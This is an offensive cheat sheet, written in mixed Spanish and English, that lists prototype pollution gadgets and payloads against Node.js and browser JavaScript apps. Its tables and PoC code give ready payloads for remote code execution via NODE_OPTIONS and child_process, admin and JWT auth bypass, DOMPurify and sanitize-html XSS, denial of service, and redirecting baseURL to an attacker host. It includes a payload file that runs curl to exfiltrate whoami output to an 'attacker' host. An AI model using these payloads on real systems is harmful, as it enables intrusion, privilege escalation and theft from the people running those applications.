---
aliases:
  - PP Gadgets
  - Prototype Pollution RCE
  - PP Auth Bypass
  - PP XSS
tags:
  - type/cheatsheet
  - vuln/prototype-pollution
  - technique/execution
  - technique/privilege-escalation
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Prototype Pollution]]'
---
# Prototype Pollution - Gadgets y Explotación

***

## RCE via child_process (Server)

| **Gadget** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| child_process.spawn options | `{"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--require /tmp/x.js"}}` | Pollute `shell` o `NODE_OPTIONS` de spawn. |
| `NODE_OPTIONS` env injection | `{"__proto__":{"env":{"NODE_OPTIONS":"--inspect-brk=0.0.0.0:9229"}}}` | Activate debug mode → RCE via debugger. |
| Pollute `execArgv` | `{"__proto__":{"execArgv":["--require","/tmp/x.js"]}}` | Forks heredan execArgv. |
| Pollute `argv` | `{"__proto__":{"argv":["node","-e","require('child_process').exec('id')"]}}` | Affects spawn behavior. |
| Pollute `windowsVerbatimArguments` | Windows-specific spawn flag | Windows targets. |
| Pollute `silent` flag | `{"__proto__":{"silent":true}}` | Side effects en logging. |
| Combine con spawn → IPC | Polluciar IPC handler | Edge case. |
| TypeOrm RCE chain | Pollution + TypeOrm config = SQL via NODE_OPTIONS | Specific stack. |
| Express RCE chain | Pollution + Express render → RCE | Common chain. |
| Webpack DevServer | Webpack config pollution dev mode | Build server RCE. |
^pp-gadget-rce

### PoC RCE via NODE_OPTIONS

```javascript
// Atacante poluciona ANTES de que server haga child_process.spawn
const userInput = JSON.parse('{"__proto__":{"shell":true,"env":{"NODE_OPTIONS":"--require /tmp/payload.js"}}}');
_.merge(config, userInput);

// Server-side, en algún momento:
require('child_process').spawn('ls', []);
// Si spawn lee `shell` y `env` de prototype → ejecuta /tmp/payload.js
```

```javascript
// /tmp/payload.js (atacante lo dropea via file upload o LFI antes)
require('child_process').exec('curl http://attacker/$(whoami)');
```

___

## Auth Bypass

| **Gadget** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| isAdmin flag global | `{"__proto__":{"isAdmin":true}}` | Backend que verifica `if(user.isAdmin)`. |
| role injection | `{"__proto__":{"role":"admin"}}` | Variant de isAdmin. |
| permissions array | `{"__proto__":{"permissions":["*"]}}` | Wildcard perms. |
| auth check bypass | `{"__proto__":{"isAuthenticated":true}}` | Más severo. |
| SAML bypass | `{"__proto__":{"validSignature":true}}` | Check pollution. |
| JWT verify pollution | `{"__proto__":{"verified":true}}` | Si app trustea flag interno. |
| Session pollution | Pollute session object → injection de fields | Express-session. |
| OAuth state bypass | Pollute state validation | Auth flow. |
| Cookie parser bypass | Pollute parsed cookie object | Edge case. |
| Local validation flags | App lógica con flags como `bypassRateLimit:true` | Custom logic gadgets. |
^pp-gadget-auth

### PoC auth bypass

```javascript
// Backend chequea
function checkAdmin(req, res, next) {
  if (req.user.isAdmin) {
    next();
  } else {
    res.status(403).send('Forbidden');
  }
}

// Atacante: pollute Object.prototype.isAdmin = true
// Cualquier user que no tenga isAdmin propio hereda true del prototype
// → req.user.isAdmin === true → bypass.
```

___

## XSS via Gadget en Sanitizer

| **Gadget** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| DOMPurify config pollution | `{"__proto__":{"ALLOWED_ATTR":["onerror","onload"]}}` | Allow XSS attrs. |
| DOMPurify ALLOWED_TAGS | `{"__proto__":{"ALLOWED_TAGS":["script"]}}` | Allow script tag. |
| DOMPurify hooks | Pollute hook que añade attribute | Edge case. |
| sanitize-html config | `{"__proto__":{"allowedTags":["script"]}}` | Bypass sanitizer. |
| Markdown-it html disable | `{"__proto__":{"html":true}}` | Enable raw HTML. |
| Vue v-html sanitization | Pollute sanitizer flags | Edge case. |
| jQuery `$.parseHTML` | Pollute parsing flags | Less common. |
| Quill / TinyMCE config | Editor config pollution | Rich text editors. |
| Combine XSS + cookie steal | Pollution → XSS → fetch cookies | Standard chain. |
^pp-gadget-xss

___

## DoS / Property Override

| **Gadget** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Override toString | `{"__proto__":{"toString":""}}` | Cualquier `.toString()` rompe. |
| Override valueOf | `{"__proto__":{"valueOf":""}}` | Comparaciones rompen. |
| Override hasOwnProperty | `{"__proto__":{"hasOwnProperty":""}}` | Object iteration breaks. |
| Override length | Object con `length` específico | Array confusion. |
| Crash JSON.stringify | `{"__proto__":{"toJSON":null}}` | Serialization fails. |
| Force iteration loops | `{"__proto__":{"length":99999999}}` | Loop con `.length` infinito. |
| Pollute Array.prototype | `{"__proto__":{"push":""}}` | `arr.push()` rompe. |
| Pollute Function.prototype | `{"__proto__":{"call":""}}` | `func.call()` rompe. |
| Recursive ref | Polluciar campo a referencia circular | JSON.stringify infinite loop. |
| Memory exhaustion | Pollute arr lengths a Number.MAX_VALUE | OOM crash. |
^pp-gadget-dos

___

## Property Injection que Cambia Logic

| **Gadget** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Default values injection | `{"__proto__":{"timeout":10000}}` | Cambia timeouts. |
| Feature flag toggle | `{"__proto__":{"betaFeatures":true}}` | Habilita features hidden. |
| Debug mode enable | `{"__proto__":{"debug":true}}` | Verbose logs. |
| Cache bypass | `{"__proto__":{"noCache":true}}` | Force fresh fetch. |
| Throttle disable | `{"__proto__":{"unlimited":true}}` | Bypass rate limit. |
| Locale forcing | `{"__proto__":{"locale":"en"}}` | Forzar idioma. |
| Currency override | `{"__proto__":{"currency":"USD"}}` | Misuse. |
| URL prefix pollution | `{"__proto__":{"baseURL":"http://attacker.com/"}}` | API redirect. |
| File path pollution | `{"__proto__":{"path":"/etc/passwd"}}` | LFI gadget. |
| Header injection | `{"__proto__":{"headers":{"X-Forwarded-For":"127.0.0.1"}}}` | Trust internal IP. |
^pp-gadget-logic

### Common gadget chain stack

```
1. Pollute Object.prototype.X = controlled value
2. Server reads obj.X expecting default → gets atacante value
3. Side effect: RCE / auth bypass / data leak / DoS
```

***
